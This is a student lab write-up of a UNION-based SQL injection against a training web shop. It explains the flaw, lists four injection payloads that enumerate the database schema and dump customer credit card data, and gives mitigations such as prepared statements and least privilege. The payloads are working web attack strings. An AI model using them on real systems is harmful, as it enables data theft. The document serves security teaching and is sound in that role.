# SQL injection with Union (GlockenEmil)

## Answers
**Explain the security problem**
    - user input is directly integrated in a sql statement. (probably just some string concatenation)
    - Using this vulnerability and the "Union" statement, it is possible to add results to the result set. The union statement must have the same amount of columns in the select. Another vulnerability is that it is possible to query the meta data of the database. This allows to collect information about the database tables etc. and makes it easy - no try and error approach is needed - to retrieve all the needed data.  

**Explain your attack (exploit, screenshot, hacking journal)**

Since I don't really know the database used, i followed the steps in the task: 
Executed statements 
1. ') UNION SELECT schema_name,1,1,1,1 FROM INFORMATION_SCHEMA.SCHEMATA #
2. ') UNION ALL SELECT table_name,1,1,1,1 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'glocken_emil' #
3. ') UNION ALL SELECT column_name,1,1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'customers' #
4. ') UNION ALL SELECT username, surname, name, creditcard,1 FROM glocken_emil.customers #
Found credit card number for hacker42 (Moser Joerg): '2323-4545-2354-8989'

**Explain mitigation (remedy)**
    - use parameterized queries (prepared statements) so sql injection is not possible
    - the connection the web server establishes to the database should not have the permission to the query meta data. It should only have the permissions needed. 
    - (WAF could probably detect and reject the malicious sql statements.)